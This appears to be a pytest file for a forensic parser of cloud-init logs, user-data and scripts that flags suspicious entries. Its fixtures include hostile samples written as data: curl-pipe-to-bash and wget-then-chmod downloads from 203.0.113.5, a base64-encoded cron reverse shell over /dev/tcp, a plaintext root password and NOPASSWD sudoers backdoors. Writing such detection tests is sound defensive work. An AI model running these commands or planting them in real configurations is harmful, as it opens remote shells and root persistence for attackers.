"""cloud-init logs, user-data and instance state (app.ingest.linux.cloud_init).

Log and state samples are copied from cloud-init 26.2 (Ubuntu 24.04) run against a NoCloud seed.
"""
from __future__ import annotations

import base64
import gzip

import pytest

from app.ingest.artifact_normalizers import normalize_linux_row
from app.ingest.linux.cloud_init import parse_cloud_init
from app.ingest.linux.dispatch import parse_linux_artifact_file
from app.ingest.linux.helpers import looks_like_linux_artifact
from app.ingest.normalizer import base_document

INSTANCE = "var/lib/cloud/instances/i-0abc123/"


@pytest.mark.parametrize(
    ("path", "kind"),
    [
        ("var/log/cloud-init.log", "cloud_init_log"),
        ("var/log/cloud-init.log.1", "cloud_init_log"),
        ("var/log/cloud-init-output.log", "cloud_init_output"),
        (INSTANCE + "user-data.txt", "user_data"),
        (INSTANCE + "vendor-data2.txt", "user_data"),
        ("var/lib/cloud/seed/nocloud/user-data", "user_data"),
        (INSTANCE + "scripts/runcmd", "cloud_script"),
        ("var/lib/cloud/scripts/per-boot/update.sh", "cloud_script"),
        ("etc/cloud/cloud.cfg", "cloud_config"),
        ("etc/cloud/cloud.cfg.d/90_dpkg.cfg", "cloud_config"),
        ("var/lib/cloud/data/status.json", "cloud_instance"),
        (INSTANCE + "datasource", "cloud_instance"),
    ],
)
def test_cloud_init_files_are_routed(path, kind):
    assert looks_like_linux_artifact(f"volume-1/{path}") == ("linux_cloud_init", kind, "linux_cloud_init_raw")


def test_processed_copies_and_pickles_are_not_parsed():
    assert looks_like_linux_artifact(INSTANCE + "user-data.txt.i") is None
    assert looks_like_linux_artifact(INSTANCE + "obj.pkl") is None


LOG = (
    "2026-10-23 18:23:53,027 - log_util.py[DEBUG]: Cloud-init v. 26.2-0ubuntu1~24.04.2 running 'init' at Fri, 23 Oct 2026 18:23:53 +0000. Up 899.70 seconds.\n"
    "2026-10-23 18:23:53,402 - distros[DEBUG]: Adding user deploy\n"
    "2026-10-23 18:23:53,402 - subp.py[DEBUG]: Running command ['useradd', 'deploy', '--shell', '/bin/bash', '-m'] with allowed return codes [0] (shell=False, capture=True)\n"
    "2026-10-23 18:23:53,430 - util.py[DEBUG]: Writing to /home/deploy/.ssh/authorized_keys - wb: [600] 72 bytes\n"
    "2026-10-23 18:23:53,435 - log_util.py[WARNING]: Failed generating key type rsa to file /etc/ssh/ssh_host_rsa_key\n"
    "Traceback (most recent call last):\n"
    '  File "/usr/lib/python3/dist-packages/cloudinit/config/cc_ssh.py", line 241, in handle\n'
    "2026-10-23 18:23:53,499 - subp.py[DEBUG]: Running command ['/var/lib/cloud/instance/scripts/runcmd'] with allowed return codes [0] (shell=False, capture=False)\n"
)


def test_log_lines_carry_commands_files_users_and_folded_tracebacks():
    rows = parse_cloud_init(LOG, source_path="var/log/cloud-init.log")
    assert [row["event_action"] for row in rows] == ["stage_start", "user_add", "command", "file_write", "log", "command"]
    start, user, command, write, warning, runcmd = rows
    assert start["cloud_init_version"] == "26.2-0ubuntu1~24.04.2" and user["cloud_init_stage"] == "init"
    assert user["username"] == "deploy" and command["command"] == "useradd deploy --shell /bin/bash -m"
    assert write["file_path"] == "/home/deploy/.ssh/authorized_keys"
    assert warning["severity"] == "warning" and "Traceback" in warning["message"] and "cc_ssh.py" in warning["message"]
    assert runcmd["command"] == "/var/lib/cloud/instance/scripts/runcmd"
    assert {row["timestamp_status"] for row in rows} == {"ok"}
    assert command["timestamp"] == "2026-10-23T18:23:53.402000+00:00"


def test_a_log_written_in_local_time_is_corrected_by_its_run_header():
    content = (
        "2026-10-23 20:23:50,000 - stages.py[DEBUG]: line before the header (rotated file)\n"
        "2026-10-23 20:23:53,027 - log_util.py[DEBUG]: Cloud-init v. 0.7.9 running 'init' at Fri, 23 Oct 2026 18:23:53 +0000. Up 9.70 seconds.\n"
        "2026-10-23 20:24:00,500 - subp.py[DEBUG]: Running command ['hostname', 'web01'] with allowed return codes [0] (shell=False, capture=True)\n"
    )
    rows = parse_cloud_init(content, source_path="var/log/cloud-init.log")
    assert [row["timestamp"] for row in rows] == [
        "2026-10-23T18:23:50+00:00", "2026-10-23T18:23:53.027000+00:00", "2026-10-23T18:24:00.500000+00:00",
    ]
    assert {row["timestamp_status"] for row in rows} == {"ok"}


def test_a_log_without_any_run_header_is_read_as_utc_and_says_so():
    rows = parse_cloud_init("2026-10-23 18:23:53,402 - distros[DEBUG]: Adding user deploy\n", source_path="var/log/cloud-init.log")
    assert rows[0]["timestamp"] == "2026-10-23T18:23:53.402000+00:00" and rows[0]["timestamp_status"] == "format_utc"


def test_console_output_takes_the_stage_header_time():
    content = (
        "Cloud-init v. 26.2 running 'modules:final' at Fri, 23 Oct 2026 18:23:53 +0000. Up 900.49 seconds.\n"
        "/var/lib/cloud/instance/scripts/runcmd: 3: curl: not found\n"
        "Cloud-init v. 26.2 finished at Fri, 23 Oct 2026 18:23:54 +0000. Datasource DataSourceNoCloud.  Up 900.52 seconds\n"
    )
    rows = parse_cloud_init(content, source_path="var/log/cloud-init-output.log")
    assert [(row["event_action"], row["timestamp"]) for row in rows] == [
        ("stage_start", "2026-10-23T18:23:53+00:00"), ("output", "2026-10-23T18:23:53+00:00"), ("stage_finish", "2026-10-23T18:23:54+00:00"),
    ]
    assert rows[1]["cloud_init_stage"] == "modules:final"


CLOUD_CONFIG = """#cloud-config
users:
  - default
  - name: deploy
    sudo: ALL=(ALL) NOPASSWD:ALL
    passwd: $6$rounds=4096$saltsalt$hashhashhash
    ssh_authorized_keys:
      - ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample deploy@laptop
chpasswd:
  list: |
    root:SuperSecret1
  expire: false
ssh_pwauth: true
write_files:
  - path: /etc/cron.d/update
    encoding: b64
    content: {b64}
packages:
  - nmap
yum_repos:
  extra:
    baseurl: http://203.0.113.5/repo
runcmd:
  - [ sh, -c, "curl -s http://203.0.113.5/x.sh | bash" ]
  - systemctl restart sshd
"""


def test_cloud_config_items_with_flags_and_no_passwords_copied():
    payload = base64.b64encode(b"* * * * * root bash -i >& /dev/tcp/203.0.113.5/4444 0>&1\n").decode()
    content = CLOUD_CONFIG.replace("{b64}", payload)
    rows = parse_cloud_init(content, source_path=INSTANCE + "user-data.txt")
    actions = [row["event_action"] for row in rows]
    assert actions == ["user", "user", "ssh_key", "password", "setting", "file_write", "package", "repository", "runcmd", "runcmd"]
    by_action = {row["event_action"]: row for row in rows}
    deploy = rows[1]
    assert deploy["username"] == "deploy" and "passwordless_sudo" in deploy["suspicious_indicators"]
    assert "password set (passwd)" in deploy["message"]
    assert all("SuperSecret1" not in row["message"] and "hashhashhash" not in row["message"] for row in rows)
    assert by_action["password"]["message"] == "chpasswd: password set for root"
    assert by_action["setting"]["suspicious_indicators"] == ["password_ssh_login"]
    written = by_action["file_write"]
    assert written["file_path"] == "/etc/cron.d/update" and "reverse_shell" in written["suspicious_indicators"]
    assert by_action["repository"]["repository_url"] == "http://203.0.113.5/repo"
    download = rows[-2]
    assert download["command"] == "sh -c 'curl -s http://203.0.113.5/x.sh | bash'" and "download_and_run" in download["suspicious_indicators"]
    assert download["line_number"] == 24 and download["instance_id"] == "i-0abc123"


def test_mime_multipart_user_data_with_a_gzipped_script_and_an_include():
    script = gzip.compress(b"#!/bin/bash\nuseradd -m backup\necho 'backup ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\n")
    content = (
        'Content-Type: multipart/mixed; boundary="BOUNDARY"\nMIME-Version: 1.0\n\n'
        '--BOUNDARY\nContent-Type: text/cloud-config\nContent-Disposition: attachment; filename="config.yaml"\n\n'
        "runcmd:\n  - echo hi\n\n"
        '--BOUNDARY\nContent-Type: text/x-shellscript\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename="setup.sh"\n\n'
        f"{base64.b64encode(script).decode()}\n\n"
        "--BOUNDARY\nContent-Type: text/x-include-url\n\n#include\nhttps://203.0.113.5/more.yaml\n\n"
        "--BOUNDARY--\n"
    )
    rows = parse_cloud_init(content, source_path="var/lib/cloud/seed/nocloud/user-data")
    assert [(row["event_action"], row.get("command") or row.get("repository_url")) for row in rows] == [
        ("runcmd", "echo hi"),
        ("script", "useradd -m backup"),
        ("script", "echo 'backup ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"),
        ("include_url", "https://203.0.113.5/more.yaml"),
    ]
    assert rows[1]["user_data_part"] == "setup.sh (text/x-shellscript)"


def test_gzipped_user_data_template_and_boothook(tmp_path):
    user_data = tmp_path / "user-data.txt"
    user_data.write_bytes(gzip.compress(b"## template: jinja\n#cloud-boothook\n#!/bin/sh\necho {{ v1.instance_id }} > /etc/id\n"))
    rows = parse_linux_artifact_file(user_data, parser="linux_cloud_init_raw", artifact_type="linux_cloud_init", source_path=INSTANCE + "user-data.txt")
    assert [(row["event_action"], row["command"], row["line_number"]) for row in rows] == [("boothook", "echo {{ v1.instance_id }} > /etc/id", 4)]


def test_per_boot_scripts_are_flagged_line_by_line():
    rows = parse_cloud_init("#!/bin/bash\n# refresh\nwget -q http://203.0.113.5/a -O /dev/shm/.a && chmod +x /dev/shm/.a\n", source_path="var/lib/cloud/scripts/per-boot/refresh.sh")
    assert len(rows) == 1 and rows[0]["line_number"] == 3
    assert {"download_and_run", "world_writable_path", "hidden_path"} <= set(rows[0]["suspicious_indicators"])


def test_unreadable_cloud_config_is_reported_not_dropped():
    rows = parse_cloud_init("#cloud-config\nruncmd: [unclosed\n", source_path=INSTANCE + "user-data.txt")
    assert rows[0]["event_action"] == "parse_error"


def test_instance_state_files():
    status = parse_cloud_init(
        '{"v1": {"datasource": "DataSourceEc2Local", "init": {"errors": ["boom"], "recoverable_errors": {"WARNING": ["slow"]}, "start": 1.0}, "stage": null}}',
        source_path="var/lib/cloud/data/status.json",
    )
    assert [(row["event_action"], row.get("cloud_init_stage")) for row in status] == [("datasource", None), ("error", "init"), ("recoverable_error", "init")]
    datasource = parse_cloud_init("DataSourceEc2Local: DataSourceEc2Local\n", source_path=INSTANCE + "datasource")[0]
    assert (datasource["datasource"], datasource["instance_id"]) == ("DataSourceEc2Local", "i-0abc123")
    instance = parse_cloud_init("i-0abc123\n", source_path="var/lib/cloud/data/instance-id")[0]
    assert instance["instance_id"] == "i-0abc123"


def test_normalized_document_severity_and_fields():
    row = parse_cloud_init("#!/bin/sh\ncurl http://203.0.113.5/x | sh\n", source_path="var/lib/cloud/scripts/per-boot/x.sh")[0]
    base = base_document("case-1", "ev-1", "art-1", row, {"artifact_type": row["artifact_family"]})
    doc = normalize_linux_row(base, row, source_path=row["source_file"], artifact_type=row["artifact_family"])
    assert doc["linux"]["artifact_family"] == "linux_cloud_init" and doc["event"]["action"] == "script"
    assert doc["event"]["severity"] == "medium" and doc["title"].startswith("cloud-init: ")
